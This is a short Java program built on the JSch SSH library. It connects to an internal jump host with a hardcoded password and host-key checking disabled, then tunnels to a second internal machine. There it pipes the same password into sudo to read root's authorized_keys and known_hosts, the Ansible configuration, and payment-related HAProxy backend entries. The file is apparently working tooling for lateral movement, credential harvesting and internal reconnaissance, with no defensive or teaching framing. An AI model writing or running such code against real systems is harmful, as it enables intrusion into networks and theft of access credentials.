import com.jcraft.jsch.*;
import java.io.*;
class SSHJ {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    int fwd = jump.setPortForwardingL(0, "10.14.16.10", 22);
    Session ts = j.getSession("user", "127.0.0.1", fwd);
    ts.setPassword("kutul0nc4t");
    ts.setConfig(p);
    ts.setTimeout(8000);
    ts.connect();
    ChannelExec ch = (ChannelExec) ts.openChannel("exec");
    ch.setCommand("echo kutul0nc4t | sudo -S cat /root/.ssh/authorized_keys;echo ---ANSIBLE-CFG---;echo kutul0nc4t | sudo -S cat /etc/ansible/ansible.cfg 2>/dev/null | head -20;echo kutul0nc4t | sudo -S find /etc/ansible/ -type f 2>/dev/null;echo ---KNOWN-HOSTS---;echo kutul0nc4t | sudo -S cat /root/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u | head -20;echo ---HAPROXY---;echo kutul0nc4t | sudo -S cat /etc/haproxy/haproxy.cfg 2>/dev/null | grep -iE 'noxify|payment|neo|xendit|server' | head -20");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    ts.disconnect();
    jump.disconnect();
  }
}
